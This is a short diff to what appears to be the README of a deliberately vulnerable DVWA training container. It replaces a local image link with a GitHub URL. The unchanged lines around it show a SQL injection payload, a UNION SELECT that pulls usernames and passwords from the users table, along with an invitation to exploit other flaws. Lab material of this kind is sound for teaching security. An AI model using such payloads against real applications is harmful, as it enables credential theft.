@@ -40,7 +40,7 @@ In the id field, add this query:
 
 	%' and 1=0 union select null, concat(user,':',password) from users #
 
-![sqli](sqli.png)
+![sqli](https://github.com/opsxcq/docker-vulnerable-dvwa/blob/master/sqli.png?raw=true)
 
 There are several other ways and other vulnerabilities do exploit, go ahead, have fun !
 
